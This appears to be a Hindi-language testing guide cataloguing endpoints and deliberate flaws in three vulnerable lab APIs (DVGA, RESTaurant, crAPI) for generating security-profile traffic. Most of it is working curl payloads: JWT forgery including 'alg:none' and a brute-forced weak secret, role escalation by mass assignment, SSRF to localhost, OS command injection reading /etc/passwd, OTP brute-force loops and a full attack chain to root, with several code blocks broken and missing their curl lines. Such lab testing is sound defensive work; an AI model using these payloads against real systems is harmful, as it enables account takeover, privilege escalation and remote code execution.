## अवलोकन

यह गाइड तीन API सुरक्षा परीक्षण एप्लिकेशन में प्रत्येक API एंडपॉइंट, जानबूझकर रखी गई कमजोरी, और अटैक पेलोड को सूचीबद्ध करती है। F5 XC API सुरक्षा प्रोफ़ाइल विकास के लिए ट्रैफ़िक जनरेशन पैटर्न बनाने हेतु इसका उपयोग करें।

| एप्लिकेशन | प्रोटोकॉल | पथ | पोर्ट | प्रमाणीकरण | कमजोरियाँ |
|---|---|---|---|---|---|
| **DVGA** | GraphQL | `/dvga/` | 80 | कोई नहीं (admin: admin/password) | 25 परिदृश्य |
| **RESTaurant** | REST (FastAPI) | `/restaurant/` | 80 | JWT (form-encoded) | 7 OWASP API 2023 श्रेणियाँ |
| **crAPI** | REST (माइक्रोसर्विसेज) | `/` | 8888 | JWT (Bearer) | 18+ चुनौतियाँ |

### एनवायरनमेंट वेरिएबल

```bash
ORIGIN="http://<ORIGIN_IP>"
CRAPI="http://<ORIGIN_IP>:8888"
```

## DVGA (Damn Vulnerable GraphQL Application)

**GraphQL एंडपॉइंट:** `POST ${ORIGIN}/dvga/graphql`
**GraphiQL IDE:** `GET ${ORIGIN}/dvga/`
**एडमिन क्रेडेंशियल:** admin / password

सभी DVGA इंटरैक्शन एक ही एंडपॉइंट (`/dvga/graphql`) का उपयोग करते हैं जिसमें JSON `{"query":"..."}` पेलोड वाले POST अनुरोध होते हैं।

### स्कीमा अवलोकन

```
Queries:  pastes, paste, me, systemHealth, systemUpdate, systemDiagnostics
Mutations: createPaste, importPaste, uploadPaste
Types:    PasteObject (id, title, content, public, owner, ipAddr, userAgent)
          OwnerObject (id, username, pastes)  ← circular reference
```

### एंडपॉइंट संदर्भ

| ऑपरेशन | प्रकार | प्रमाणीकरण | उद्देश्य |
|---|---|---|---|
| `pastes(public, filter, limit)` | Query | नहीं | पेस्ट सूची (filter द्वारा SQL इंजेक्शन) |
| `paste(id)` | Query | नहीं | एकल पेस्ट प्राप्त करें |
| `me(token)` | Query | नहीं | JWT द्वारा उपयोगकर्ता प्राप्त करें (फोर्जरी संवेदनशील) |
| `systemHealth` | Query | नहीं | स्वास्थ्य जाँच |
| `systemUpdate` | Query | नहीं | धीमी क्वेरी (~82 सेकंड, DoS वेक्टर) |
| `systemDiagnostics(cmd)` | Query | admin/password | श्वेतसूचीबद्ध OS कमांड निष्पादित करें |
| `createPaste(title, content, public)` | Mutation | नहीं | पेस्ट बनाएँ (content द्वारा XSS) |
| `importPaste(host, port, path, scheme)` | Mutation | नहीं | दूरस्थ पेस्ट आयात (SSRF, कमांड इंजेक्शन) |
| `uploadPaste(filename, content)` | Mutation | नहीं | पेस्ट अपलोड (पथ ट्रैवर्सल) |

### कमजोरी कैटलॉग

#### 1. सेवा अस्वीकार (6 परिदृश्य)

**बैच क्वेरी अटैक:**
```bash

  -H "Content-Type: application/json" \
  -d '[{"query":"{systemUpdate}"},{"query":"{systemUpdate}"},{"query":"{systemUpdate}"}]'
```

**गहन पुनरावृत्ति (सर्कुलर Owner/Paste संदर्भ):**

  -d '{"query":"{pastes{owner{pastes{owner{pastes{owner{pastes{owner{pastes{title}}}}}}}}}}"}'

## RESTaurant API (Damn Vulnerable RESTaurant)

**Swagger UI:** `${ORIGIN}/restaurant/docs`
**OpenAPI स्पेक:** `${ORIGIN}/restaurant/openapi.json`
**प्रमाणीकरण:** `/restaurant/token` पर form-encoded POST द्वारा JWT
**भूमिकाएँ:** Customer (डिफ़ॉल्ट), Employee, Chef (एडमिन)

### सेटअप: पंजीकरण और प्रमाणीकरण

```bash
# Register a test user
curl -X POST ${ORIGIN}/restaurant/register \
  -H "Content-Type: application/json" \
  -d '{"username":"attacker","password":"Attack123","first_name":"Test","last_name":"User","phone_number":"5551234567"}'

# Get JWT token (NOTE: form-encoded, not JSON)
TOKEN=$(curl -sf -X POST ${ORIGIN}/restaurant/token \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=attacker&password=Attack123" | python3 -c "import sys,json; print(json.load(sys.stdin)['access_token'])")

echo "Bearer token: ${TOKEN}"
```

### कमजोरी कैटलॉग

#### API1:2023 — टूटा हुआ ऑब्जेक्ट स्तरीय प्राधिकरण (BOLA)

**किसी अन्य उपयोगकर्ता की प्रोफ़ाइल संशोधित करें:**
```bash
curl -X PUT ${ORIGIN}/restaurant/profile \
  -H "Authorization: Bearer ${TOKEN}" \
  -H "Content-Type: application/json" \
  -d '{"username":"chef","phone_number":"hacked","first_name":"Pwned","last_name":"User"}'
```

**अन्य उपयोगकर्ताओं के ऑर्डर एक्सेस करें (ऑफ़सेट एन्यूमरेट करें):**
```bash
for i in 1 2 3 4 5; do
  curl -sf ${ORIGIN}/restaurant/orders/${i} \
    -H "Authorization: Bearer ${TOKEN}" 2>&1
  echo ""
done
```

#### API2:2023 — टूटा हुआ प्रमाणीकरण

**JWT कमजोर सीक्रेट ब्रूट-फ़ोर्स (सीक्रेट 6 अंकों का है: 97952):**
```bash
# Decode and forge tokens at jwt.io
# Secret: 97952 (brute-forceable with hashcat -a 3 -m 16500 token '?d?d?d?d?d?d')

# Forge a Chef token:
# Header: {"alg":"HS256","typ":"JWT"}
# Payload: {"sub":"chef","exp":9999999999}
# Sign with secret: 97952
```

#### API3:2023 — टूटा हुआ ऑब्जेक्ट प्रॉपर्टी स्तरीय प्राधिकरण (BOPLA)

**Customer से Chef तक भूमिका का सामूहिक असाइनमेंट:**
```bash
curl -X PATCH ${ORIGIN}/restaurant/profile \
  -H "Authorization: Bearer ${TOKEN}" \
  -H "Content-Type: application/json" \
  -d '{"role":"Chef"}'
```

**वृद्धि पथ: Customer → Employee → Chef:**
```bash
# Step 1: Escalate to Employee
curl -X PATCH ${ORIGIN}/restaurant/profile \
  -H "Authorization: Bearer ${TOKEN}" \
  -H "Content-Type: application/json" \
  -d '{"role":"Employee"}'

# Step 2: Escalate to Chef
curl -X PATCH ${ORIGIN}/restaurant/profile \
  -H "Authorization: Bearer ${TOKEN}" \
  -H "Content-Type: application/json" \
  -d '{"role":"Chef"}'
```

#### API5:2023 — टूटा हुआ फ़ंक्शन स्तरीय प्राधिकरण (BFLA)

**Customer के रूप में मेनू आइटम हटाएँ (Employee+ की आवश्यकता होनी चाहिए):**
```bash
curl -X DELETE ${ORIGIN}/restaurant/menu/1 \
  -H "Authorization: Bearer ${TOKEN}"
```

**किसी अन्य उपयोगकर्ता की भूमिका बदलें:**
```bash
curl -X PUT ${ORIGIN}/restaurant/users/update_role \
  -H "Authorization: Bearer ${TOKEN}" \
  -H "Content-Type: application/json" \
  -d '{"username":"chef","role":"Customer"}'
```

#### API7:2023 — सर्वर-साइड अनुरोध फोर्जरी (SSRF)

**मेनू image_url द्वारा आंतरिक एंडपॉइंट की जाँच करें (Employee भूमिका आवश्यक):**
```bash
# First escalate to Employee via BOPLA, then:
curl -X PUT ${ORIGIN}/restaurant/menu \
  -H "Authorization: Bearer ${TOKEN}" \
  -H "Content-Type: application/json" \
  -d '{"name":"SSRF Test","price":1.00,"category":"Test","image_url":"http://127.0.0.1:8091/admin/reset-chef-password"}'
```

#### API8:2023 — इंजेक्शन

**डिस्क स्टैट्स द्वारा OS कमांड इंजेक्शन (Chef भूमिका आवश्यक):**
```bash
# After escalating to Chef:
curl -sf "${ORIGIN}/restaurant/admin/stats/disk?parameters=;whoami" \
  -H "Authorization: Bearer ${TOKEN}"

curl -sf "${ORIGIN}/restaurant/admin/stats/disk?parameters=;cat%20/etc/passwd" \
  -H "Authorization: Bearer ${TOKEN}"
```

### पूर्ण अटैक चेन: Customer से Root तक

```bash
# 1. Register
curl -X POST ${ORIGIN}/restaurant/register \
  -H "Content-Type: application/json" \
  -d '{"username":"hacker","password":"Hack123","first_name":"H","last_name":"X","phone_number":"0"}'

# 2. Get token
TOKEN=$(curl -sf -X POST ${ORIGIN}/restaurant/token \
  -d "username=hacker&password=Hack123" | python3 -c "import sys,json;print(json.load(sys.stdin)['access_token'])")

# 3. Escalate to Chef (BOPLA)
curl -X PATCH ${ORIGIN}/restaurant/profile \
  -H "Authorization: Bearer ${TOKEN}" \
  -H "Content-Type: application/json" \
  -d '{"role":"Chef"}'

# 4. Re-authenticate to get Chef-level token
TOKEN=$(curl -sf -X POST ${ORIGIN}/restaurant/token \
  -d "username=hacker&password=Hack123" | python3 -c "import sys,json;print(json.load(sys.stdin)['access_token'])")

# 5. Command injection (RCE)
curl -sf "${ORIGIN}/restaurant/admin/stats/disk?parameters=;id" \
  -H "Authorization: Bearer ${TOKEN}"
```

## crAPI (OWASP Completely Ridiculous API)

**वेब UI:** `${CRAPI}/`
**MailHog:** `${CRAPI}/mailhog/` (सत्यापन के लिए ईमेल कैप्चर)
**प्रमाणीकरण:** JWT Bearer टोकन (RS256, एल्गोरिथम कन्फ़्यूज़न के प्रति संवेदनशील)
**आर्किटेक्चर:** 7 माइक्रोसर्विसेज (identity, community, workshop, postgres, mongo, mailhog, web)

### सेटअप: पंजीकरण, ईमेल सत्यापन, लॉगिन

```bash
# 1. Register
curl -X POST ${CRAPI}/identity/api/auth/signup \
  -H "Content-Type: application/json" \
  -d '{"name":"Test User","email":"tester@example.com","number":"5551234567","password":"TestPass123"}'

# 2. Check MailHog for verification email
# Browse to ${CRAPI}/mailhog/ or use MailHog API:
curl -sf ${CRAPI}/mailhog/api/v2/messages | python3 -c "
import sys,json
msgs = json.load(sys.stdin)['items']
for m in msgs:
    print(f\"To: {m['Raw']['To'][0]}, Subject: {m['Content']['Headers']['Subject'][0]}\")
"

# 3. Login and get JWT token
TOKEN=$(curl -sf -X POST ${CRAPI}/identity/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"tester@example.com","password":"TestPass123"}' | python3 -c "import sys,json;print(json.load(sys.stdin)['token'])")

echo "Bearer token: ${TOKEN}"
```

#### चुनौती 1 — BOLA: किसी अन्य उपयोगकर्ता के वाहन स्थान तक पहुँच

```bash
# Get your vehicle UUID first

  -H "Authorization: Bearer ${TOKEN}"

```

#### चुनौती 2 — BOLA: मैकेनिक रिपोर्ट एक्सेस (कोई प्रमाणीकरण नहीं)

```bash
# Sequential ID enumeration — no token needed
for i in 1 2 3 4 5; do
  echo "Report $i:"
  curl -sf "${CRAPI}/workshop/api/mechanic/mechanic_report?report_id=${i}"
  echo ""
done
```

#### चुनौती 3 — टूटा हुआ प्रमाणीकरण: पासवर्ड रीसेट OTP का ब्रूट-फ़ोर्स

```bash
# Request OTP for victim
curl -X POST ${CRAPI}/identity/api/auth/forget-password \
  -H "Content-Type: application/json" \
  -d '{"email":"victim@example.com"}'

# Brute-force 4-digit OTP (v2 has NO rate limiting)
for otp in $(seq -w 0000 9999); do
  RESULT=$(curl -sf -X POST ${CRAPI}/identity/api/auth/v2/check-otp \
    -H "Content-Type: application/json" \
    -d "{\"email\":\"victim@example.com\",\"otp\":\"${otp}\"}" 2>&1)
  echo "$otp: $RESULT" | grep -v "Invalid OTP" && break
done
```

#### चुनौती 15 — JWT एल्गोरिथम कन्फ़्यूज़न

```bash
# Forge a JWT with algorithm "none" (no signature verification):
# 1. Set header: {"alg":"none","typ":"JWT"} and base64url-encode it
# 2. Set payload: {"email":"admin@example.com","role":"admin"} and base64url-encode it
# 3. Join with dots, leave signature empty: <header>.<payload>.
HEADER=$(echo -n '{"alg":"none","typ":"JWT"}' | base64 -w0 | tr '+/' '-_' | tr -d '=')
PAYLOAD=$(echo -n '{"email":"admin@example.com","role":"admin"}' | base64 -w0 | tr '+/' '-_' | tr -d '=')
FORGED="${HEADER}.${PAYLOAD}."

curl -sf ${CRAPI}/identity/api/v2/user/dashboard \
  -H "Authorization: Bearer ${FORGED}"
```

## ट्रैफ़िक जनरेशन पैटर्न

### चरण 1: बेसलाइन (हैप्पी पाथ)

अटैक पैटर्न परीक्षण से पहले सामान्य API व्यवहार स्थापित करने के लिए वैध ट्रैफ़िक उत्पन्न करें।

**DVGA बेसलाइन:**
```bash
# Normal queries
curl -X POST ${ORIGIN}/dvga/graphql -H "Content-Type: application/json" -d '{"query":"{pastes{id title}}"}'
curl -X POST ${ORIGIN}/dvga/graphql -H "Content-Type: application/json" -d '{"query":"mutation{createPaste(title:\"note\",content:\"hello\",public:true){paste{id}}}"}'
```

**RESTaurant बेसलाइन:**
```bash
curl -sf ${ORIGIN}/restaurant/menu -H "Authorization: Bearer ${TOKEN}"
curl -sf ${ORIGIN}/restaurant/profile -H "Authorization: Bearer ${TOKEN}"
curl -X POST ${ORIGIN}/restaurant/orders -H "Authorization: Bearer ${TOKEN}" -H "Content-Type: application/json" -d '{"menu_item_id":1,"quantity":1}'
```

**crAPI बेसलाइन:**
```bash
curl -sf ${CRAPI}/identity/api/v2/user/dashboard -H "Authorization: Bearer ${TOKEN}"
curl -sf ${CRAPI}/workshop/api/shop/products -H "Authorization: Bearer ${TOKEN}"
curl -sf ${CRAPI}/community/api/v2/community/posts -H "Authorization: Bearer ${TOKEN}"
```

### चरण 2: OWASP श्रेणी के अनुसार अटैक ट्रैफ़िक

**BOLA परीक्षण:** अनुक्रमिक ID एन्यूमरेट करें, अनुरोधों में उपयोगकर्ता पहचानकर्ता बदलें, स्वामित्व के बिना संसाधनों तक पहुँचें।

**इंजेक्शन परीक्षण:** filter/coupon पैरामीटर में SQL पेलोड, GraphQL क्वेरी इंजेक्शन, पैरामीटर फ़ील्ड द्वारा OS कमांड इंजेक्शन।

**प्रमाणीकरण बाइपास परीक्षण:** JWT टोकन फोर्ज करें, OTP ब्रूट-फ़ोर्स करें, अप्रचलित API संस्करण उपयोग करें, एल्गोरिथम कन्फ़्यूज़न।

**SSRF परीक्षण:** `importPaste`, `image_url`, और `mechanic_api` पैरामीटर में आंतरिक URL।

**DoS परीक्षण:** GraphQL बैच/पुनरावृत्ति/एलियास अटैक, उच्च संख्या के साथ `repeat_request_if_failed`।

### चरण 3: स्टेटफ़ुल अटैक चेन

कुछ अटैक के लिए स्थिति के साथ बहु-चरणीय अनुक्रम आवश्यक हैं:

1. **RESTaurant वृद्धि चेन:** पंजीकरण → टोकन → PATCH भूमिका को Chef करें → पुनः प्रमाणीकरण → कमांड इंजेक्शन
2. **crAPI पूर्ण प्रवाह:** साइनअप → ईमेल सत्यापन (MailHog) → लॉगिन → वाहन जोड़ें → कॉन्टैक्ट मैकेनिक (SSRF) → ऑर्डर हेरफेर
3. **DVGA रिकॉन-टू-एक्सप्लॉइट:** इंट्रोस्पेक्शन → systemDiagnostics खोजें → एडमिन क्रेडेंशियल ब्रूट-फ़ोर्स → OS कमांड निष्पादन
